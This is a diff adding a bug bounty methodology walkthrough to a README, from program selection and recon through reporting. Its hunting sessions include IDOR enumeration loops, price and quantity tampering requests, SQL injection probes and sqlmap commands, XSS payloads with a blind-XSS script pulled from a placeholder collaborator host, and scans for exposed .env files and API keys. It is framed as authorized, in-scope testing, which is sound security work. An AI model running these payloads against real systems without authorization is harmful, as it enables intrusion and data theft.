@@ -17,12 +17,502 @@
 > *"The hunter who maps the terrain before the hunt never returns empty-handed."*
 
 Bug bounty hunting isn't about running tools — it's about **understanding attack surfaces** and **thinking like an adversary**. This methodology gives you the reconnaissance backbone, the enumeration muscle, and the exploitation instinct to turn surface-level scanning into deep, impactful discoveries. The tools are just the brush. Your mind is the canvas.
-
 No fluff. No filler. Just the workflow that finds bugs.
 
 </div>
 
 <br>
+
+---
+
+## &#x1F3AF; Real Bug Bounty Hunt — Live Target Walkthrough
+
+> *This is the exact workflow I use on every paid bug bounty program. Follow it end-to-end.*
+
+---
+
+### &#x1F4CB; Phase 1: Pick a Program & Read the Rules
+
+```bash
+# Go to HackerOne, Bugcrowd, or Intigriti. Pick a program that has:
+# ✓ "Responds within 3 days" or faster
+# ✓ Clear scope defined (not "all *.target.com assets")
+# ✓ Bounties paid recently (check "Hacktivity" / disclosed reports)
+# ✓ You understand the product (SaaS, e-commerce, social, etc.)
+
+# DON'T pick programs that:
+# ✗ "No bounties" or "thanks only"
+# ✗ Have 100+ unresolved reports (backlog = slow triage)
+# ✗ Scope is "everything we own" (scope creep = wasted time)
+# ✗ Last bounty was 6+ months ago (dead program)
+```
+
+**Step 1: Read the policy. Actually read it.**
+```bash
+# Look for:
+# - What's IN scope (subdomains, apps, mobile, APIs?)
+# - What's OUT of scope (DoS, social engineering, physical?)
+# - Safe harbor (promises not to sue — most programs have this)
+# - Bounty table (Critical=$3000, High=$1500, Medium=$500, Low=$100)
+
+# CRITICAL: If it says "no automated scanning" → manual testing only.
+# If it says "no account creation" → only test what you can reach unauthenticated.
+# Violating policy = banned from platform + wasted time.
+```
+
+**Step 2: Create a test account.**
+```bash
+# NEVER test with your personal email/account.
+# Create: bugbounty.YOURNAME+TARGET@gmail.com
+# This is your throwaway account for this program.
+# If you get banned/locked → no impact on your real account.
+```
+
+---
+
+### &#x1F4E6; Phase 2: Setup Project Structure
+
+```bash
+mkdir -p ~/bounties/target/{recon,urls,testing,jsscan,findings,reports}
+cd ~/bounties/target
+
+# Create program notes
+cat > program.txt << 'EOF'
+PROGRAM: Target Name
+PLATFORM: HackerOne
+URL: https://hackerone.com/target
+SCOPE: *.target.com, api.target.com
+OUT OF SCOPE: DoS, physical attacks
+BOUNTY RANGE: $150-5000
+NOTES: Reflected XSS seems filtered. Focus on stored + DOM.
+EOF
+
+# This keeps you organized. When you come back after 3 days,
+# you know exactly where you left off.
+```
+
+---
+
+### &#x1F50D; Phase 3: Reconnaissance (2-4 Hours)
+
+> This is where 80% of hunters fail. They skip recon. Don't be them.
+
+**Step 1: Subdomain Discovery**
+```bash
+# Passive — fast, undetectable
+subfinder -d target.com -silent -all -o subs_passive.txt
+amass enum -passive -d target.com -silent -o subs_amass.txt
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subs_crtsh.txt
+
+cat subs_*.txt | sort -u > subs_all.txt
+echo "Total subdomains: $(wc -l < subs_all.txt)"
+# Expected: 50-5000 subdomains depending on company size
+```
+
+**Step 2: Find Live Websites**
+```bash
+cat subs_all.txt | httpx -silent -title -status-code -o subs_live.txt
+cat subs_live.txt | awk '{print $1}' > urls_live.txt
+
+echo "Live websites: $(wc -l < urls_live.txt)"
+# Expected: 10-500 live websites
+
+# Filter for HIGH VALUE targets FIRST:
+cat subs_live.txt | grep -iE "login|admin|dashboard|api|dev|staging|portal|app|manage" > urls_priority.txt
+echo "Priority targets: $(wc -l < urls_priority.txt)"
+```
+
+**Step 3: Technology Fingerprinting**
+```bash
+# What are they running? This tells you which vulns to test.
+cat urls_live.txt | httpx -silent -tech-detect -o subs_tech.txt
+
+# Look for:
+# React/Angular/Vue → Check for API endpoints, GraphQL
+# PHP → Test for LFI, PHP deserialization, type juggling
+# Java → Test for Spring Boot actuators, JNDI, deserialization
+# WordPress → Test for plugin vulns, XMLRPC, user enumeration
+# Node.js → Test for prototype pollution, SSTI (Pug/EJS)
+```
+
+**Step 4: URL Discovery**
+```bash
+# Get every URL that ever existed on this target
+cat urls_live.txt | gau --subs | anew all_urls.txt
+cat urls_live.txt | while read url; do
+  echo "$url" | katana -silent -jc | anew all_urls.txt
+done
+cat urls_live.txt | waybackurls | anew all_urls.txt
+
+echo "Total URLs: $(wc -l < all_urls.txt)"
+
+# Extract URLs with parameters — these are your TARGETS
+cat all_urls.txt | grep "=" | sort -u > urls_with_params.txt
+echo "URLs with parameters: $(wc -l < urls_with_params.txt)"
+# Expected: 500-50,000 parameterized URLs
+```
+
+**Step 5: JavaScript Recon**
+```bash
+# JS files are secret gold mines
+cat all_urls.txt | grep "\.js$" | sort -u > js_files.txt
+echo "JS files: $(wc -l < js_files.txt)"
+
+# Hunt for API keys
+cat js_files.txt | while read js; do
+  curl -s "$js" | grep -oE '"[^"]{20,}"' | grep -iE "key|token|secret|password" 
+done 2>/dev/null | sort -u > js_secrets_raw.txt
+
+# Hunt for internal API routes
+cat js_files.txt | while read js; do
+  curl -s "$js" | grep -oE '"/api/[^"]+"' 
+done 2>/dev/null | sort -u > js_api_routes.txt
+
+# Check for source maps
+cat js_files.txt | grep "\.map$" > js_maps.txt
+# If source maps exist → download them → you have the FULL source code
+```
+
+---
+
+### &#x1F4CA; Phase 4: Prioritization (15 Minutes)
+
+> You can't test 50,000 URLs manually. Triage ruthlessly.
+
+**Triage your parameterized URLs:**
+```bash
+# HIGH PRIORITY — test these FIRST
+cat urls_with_params.txt | grep -iE "id=|user=|account=|order=|admin=|role=|token=|redirect=|url=|path=|file=|page=" > urls_high.txt
+
+# MEDIUM PRIORITY — test after high
+cat urls_with_params.txt | grep -iE "search=|q=|query=|email=|name=|comment=|message=|description=|title=" > urls_medium.txt
+
+# LOW PRIORITY — test if you have time
+cat urls_with_params.txt | grep -v -f urls_high.txt | grep -v -f urls_medium.txt > urls_low.txt
+
+echo "High: $(wc -l < urls_high.txt) | Medium: $(wc -l < urls_medium.txt) | Low: $(wc -l < urls_low.txt)"
+```
+
+**The 80/20 Rule:**
+```text
+Test ONLY these first (80% of bugs come from 20% of URLs):
+1. Authentication pages   (/login, /register, /reset)
+2. User profile endpoints  (/profile, /settings, /account)
+3. API endpoints           (/api/user/*, /api/admin/*)
+4. Payment/cart flows      (/cart, /checkout, /payment)
+5. File upload endpoints   (/upload, /avatar, /import)
+```
+
+---
+
+### &#x1F3AF; Phase 5: Systematic Hunting (Per Session)
+
+> One session = One vulnerability class. Don't jump between XSS and SQLi.
+
+#### Session 1: IDOR (30 minutes — highest ROI)
+
+```bash
+# The quickest high-impact bug for beginners
+
+# Step 1: Log in. Visit your profile. Note the URL.
+# Example: GET /api/user/1234/profile
+
+# Step 2: Change the ID. 
+curl -s -H "Cookie: YOUR_SESSION" "https://target.com/api/user/1235/profile" | jq .
+# Can you see user 1235's data? → IDOR. Report it.
+
+# Step 3: Try sequential IDs.
+for id in $(seq 1 50); do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: YOUR_SESSION" "https://target.com/api/user/$id/profile")
+  [ "$code" = "200" ] && echo "IDOR: user $id → $code"
+done
+
+# Step 4: Check EVERY endpoint that has an ID in the URL.
+# /api/order/123, /api/message/456, /api/document/789
+# If IDOR works on user profile → test ALL siblings.
+```
+
+#### Session 2: Business Logic (30 minutes)
+
+```bash
+# No exploits needed. Just think like a sneaky user.
+
+# Coupon stacking: apply SAME50 twice
+curl -s -X POST -H "Cookie: YOUR_SESSION" "https://target.com/cart/coupon" -d '{"code":"SAVE20"}'
+curl -s -X POST -H "Cookie: YOUR_SESSION" "https://target.com/cart/coupon" -d '{"code":"SAVE20"}'
+# Does the second application stack? → Report.
+
+# Negative quantity
+curl -s -X POST -H "Cookie: YOUR_SESSION" "https://target.com/cart/add" -d '{"product_id":1,"quantity":-1}'
+# Negative total in cart? → Free items or money back.
+
+# Price tampering
+curl -s -X POST -H "Cookie: YOUR_SESSION" "https://target.com/checkout" -d '{"total":0.01,"items":[{"id":1,"price":999.99}]}'
+# Server trusts your submitted price? → Buy anything for $0.01.
+
+# Trial extension
+curl -s -X PUT -H "Cookie: YOUR_SESSION" "https://target.com/account/subscription" -d '{"plan":"premium","trial_days":99999}'
+# Infinite free trial.
+```
+
+#### Session 3: SQL Injection (30 minutes)
+
+```bash
+# Quickest wins first:
+
+# Method 1: Manual probe on all high-priority URLs
+cat urls_high.txt | grep "id=" | while read url; do
+  curl -s "$url'" | grep -iE "sql|mysql|syntax|error|ORA-|PostgreSQL" > /dev/null && echo "SQLi: $url"
+done
+
+# Method 2: sqlmap on promising candidates
+sqlmap -u "https://target.com/product?id=1" --batch --dbs --random-agent
+
+# Method 3: Check cookies, headers, JSON bodies too
+# TrackingId=abc' → time-based: TrackingId=abc'||pg_sleep(5)--
+```
+
+#### Session 4: XSS (30 minutes)
+
+```bash
+# Fastest wins:
+
+cat urls_high.txt | qsreplace '"><h1>XSS</h1>' | while read url; do
+  curl -s "$url" | grep -q "<h1>XSS</h1>" && echo "XSS: $url"
+done
+
+# If reflected, escalate:
+cat urls_high.txt | qsreplace '"><img src=x onerror=alert(1)>' | while read u; do
+  curl -s "$u" | grep -q "img src=x onerror" && echo "XSS CONFIRMED: $u"
+done
+
+# Check blind XSS on every form:
+# Name field: <script src=//YOUR-COLLABORATOR.oastify.com/xss></script>
+# If you get a callback → blind XSS confirmed
+```
+
+#### Session 5: Information Disclosure (20 minutes)
+
+```bash
+# Easiest findings — just search:
+
+# Check for exposed .git
+cat urls_live.txt | while read url; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$url/.git/HEAD")
+  [ "$code" = "200" ] && echo ".git EXPOSED: $url/.git/"
+done
+
+# Check for exposed .env
+cat urls_live.txt | while read url; do
+  for env in ".env" ".env.local" ".env.production" ".env.backup"; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$env")
+    [ "$code" = "200" ] && echo "$env EXPOSED: $url/$env"
+  done
+done
+
+# Check JS for API keys (re-run if you found new JS files)
+cat js_secrets_raw.txt | grep -oE "(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35}|ghp_[0-9a-zA-Z]{36}|sk-[a-zA-Z0-9]{48})" | sort -u
+```
+
+---
+
+### &#x2705; Phase 6: Validate Your Finding (5 Minutes)
+
+> Before you write a report, answer these 7 questions:
+
+```text
+THE 7-QUESTION GATE — all must be YES
+
+1. Can I reproduce it consistently? 
+   → Run your exploit 3 times. Same result each time.
+
+2. Is it in the program's scope?
+   → Check the policy. Out-of-scope = rejected.
+
+3. Is the impact clear and demonstrable?
+   → Can I show what an attacker can actually DO with this?
+
+4. Is it NOT a known/duplicate report?
+   → Search disclosed reports on the platform. Check for similar findings.
+
+5. Is it a real security issue?
+   → Self-XSS is not a bug. Missing rate limit on a non-sensitive endpoint is not a bug.
+   → "Could lead to" is not enough. Prove it.
+
+6. Did I test on MY OWN test account?
+   → NEVER access other users' real data. NEVER delete production data.
+
+7. Is my evidence clean?
+   → No session cookies visible in screenshots. No real user PII exposed.
+```
+
+**Common false positives — DON'T report these:**
+```text
+✗ "Missing CSP header" — not a vulnerability by itself
+✗ "Clickjacking" on a page with no sensitive actions
+✗ "Self-XSS" — you can only attack yourself
+✗ "Rate limit missing" on search endpoint — no impact
+✗ "SSL/TLS not using latest version" — unless broken
+✗ "Password autocomplete enabled" — browser feature
+✗ "Server discloses version" — informational, not a vuln
+```
+
+---
+
+### &#x1F4DD; Phase 7: Write the Report (15 Minutes)
+
+**The title formula:**
+```text
+[Vulnerability Type] in [Component] allows [Impact]
+
+Examples:
+✓ "IDOR in /api/user endpoint allows access to any user's PII"
+✓ "SQL Injection in search parameter allows database extraction"
+✓ "Stored XSS in profile name allows account takeover"
+
+✗ "IDOR found" (too vague)
+✗ "Possible SQL injection in parameter" (say what it does)
+```
+
+**The impact statement (most important part):**
+```text
+An attacker can [action] which results in [business impact].
+
+GOOD: "An attacker can change any user's email by modifying the 
+       user_id parameter in POST /api/user/update, leading to 
+       account takeover of any user on the platform."
+
+BAD: "The user_id parameter is not validated." (no impact stated)
+```
+
+**Step-by-step reproduction:**
+```bash
+# Write these exact steps. The triager MUST be able to follow them.
+# Use YOUR test accounts. Show YOUR test data.
+
+1. Log in as User A (test account: hunter_A@test.com)
+2. Visit https://target.com/api/user/1234/profile
+3. Note: response shows User 1234's email, name, address
+4. Log out. Log in as User B (test account: hunter_B@test.com)  
+5. Visit https://target.com/api/user/1234/profile
+6. Note: User B can ALSO see User 1234's data
+7. Attached screenshot shows User B viewing User 1234's PII
+```
+
+**Evidence checklist:**
+```text
+□ Screenshot 1: Normal page without attack
+□ Screenshot 2: HTTP request (Burp Repeater, hide cookies)
+□ Screenshot 3: HTTP response showing the exploit worked
+□ Screenshot 4: Browser showing the IMPACT
+□ cURL command that reproduces the finding
+```
+
+---
+
+### &#x1F4C8; Phase 8: After Submission — What to Do
+
+```text
+1. Track your submission
+→ Platform → My Reports → Note the report ID
+→ Expected response: 1-7 days for triage, 1-4 weeks for resolution
+
+2. While waiting — continue hunting the SAME target
+→ While you know the attack surface well:
+→ Test sibling endpoints (IDOR on user/1 → test user/2 through user/100)
+→ Test the same parameter class across all endpoints
+→ Look for the same bug pattern in different API versions
+
+3. If triager asks for more info:
+→ Respond within 24 hours
+→ Provide exactly what they asked for
+→ Be professional, not defensive
+→ "Here's additional evidence" > "But I already proved it"
+
+4. If report is closed as duplicate:
+→ Ask which report # it duplicates (you might learn something)
+→ If you disagree: politely ask for re-review with new evidence
+→ Don't argue. Move on.
+
+5. If report is closed as N/A (not applicable):
+→ Read the reason carefully
+→ If truly wrong: re-read the 7-Question Gate → maybe it wasn't valid
+→ Learn from it. Every N/A teaches you something.
+```
+
+---
+
+### &#x1F4AC; Real Hunting Session Example (30-Minute Sprint)
+
+```bash
+# 09:00 — Start session
+export TARGET="redacted-bug-bounty-target.com"
+cd ~/bounties/$TARGET
+
+# 09:02 — Quick recon refresh (new subdomains since yesterday?)
+subfinder -d $TARGET -silent -all | anew subs_all.txt
+cat subs_all.txt | httpx -silent -title -sc | anew subs_live.txt
+
+# 09:05 — Pick ONE URL type for this session
+# Today: I'm hunting IDOR in API endpoints
+cat urls_high.txt | grep "/api/" | grep "id=" | head -20 > todays_targets.txt
+
+# 09:06-09:30 — Hunt
+while read url; do
+  echo "[*] Testing: $url"
+  
+  # Probe: change the ID, same session
+  original=$(echo "$url" | grep -oP 'id=\K[0-9]+')
+  test_id=$((original + 1))
+  test_url=$(echo "$url" | sed "s/id=$original/id=$test_id/")
+  
+  response=$(curl -s -H "Cookie: YOUR_SESSION" "$test_url")
+  original_resp=$(curl -s -H "Cookie: YOUR_SESSION" "$url")
+  
+  # If responses are different AND both return 200 → investigate
+  if [ ${#response} -gt 100 ] && [ "$response" != "$original_resp" ]; then
+    echo "[!] POTENTIAL IDOR: $test_url" >> findings_today.txt
+  fi
+done < todays_targets.txt
+
+# 09:30 — Document any findings
+cat findings_today.txt
+# If found: validate 3 times, screenshot, write PoC
+
+# 09:30 — Session end. Archive everything.
+cp -r . ~/bounties/$TARGET/session_$(date +%Y%m%d_%H%M)/
+```
+
+---
+
+### &#x26A0; Real-World Pitfalls (I Learned These the Hard Way)
+
+```text
+✗ Testing on production during business hours.
+   FIX: Test during off-peak. Or use rate limits (--delay in ffuf/sqlmap).
+
+✗ Submitting too quickly — excited but sloppy.
+   FIX: Always re-read your report after 10 minutes. You'll catch mistakes.
+
+✗ Testing out-of-scope subdomains.
+   FIX: Check scope BEFORE running any tool. Create a scope file.
+
+✗ Running Nuclei on everything without reading the output.
+   FIX: Nuclei finds patterns. YOU find bugs. Don't auto-submit scanner output.
+
+✗ Giving up after 2 hours of no findings.
+   FIX: Bug bounty is RNG + skill. Some days: 3 criticals. Some days: nothing.
+   The hunters who succeed are the ones who show up consistently.
+
+✗ Using the same approach on every target.
+   FIX: Each target is different. E-commerce → business logic. SaaS → IDOR.
+   Social media → XSS. API-heavy → auth bypass. Tailor your approach.
+
+✗ Not tracking your time.
+   FIX: You're investing hours. Track what works. Double down on high-ROI activities.
+```
+
+---
 
 ---
 
@@ -342,7 +832,8 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 
 | # | Section | Focus |
 |---|---------|-------|
-| **0** | [**Quick Start**](#-quick-start--your-first-bug-bounty-hunt) | **Tool Install · First Hunt · Step-by-Step** |
+| **0A** | [**Real Bug Bounty Hunt**](#-real-bug-bounty-hunt--live-target-walkthrough) | **Live Target · 8 Phases · Program Pick → Report** |
+| **0B** | [**Quick Start**](#-quick-start--your-first-bug-bounty-hunt) | **Tool Install · Practice Target · First Hunt** |
 | 1 | [Reconnaissance](#1-reconnaissance-and-subdomain-enumeration) | Subdomain Enumeration & Scanning |
 | 2 | [Discovery](#2-discovery-and-probing) | HTTP Probing & Asset Discovery |
 | 3 | [Enumeration](#3-advanced-enumeration-techniques) | Parameters, Content & API Discovery |
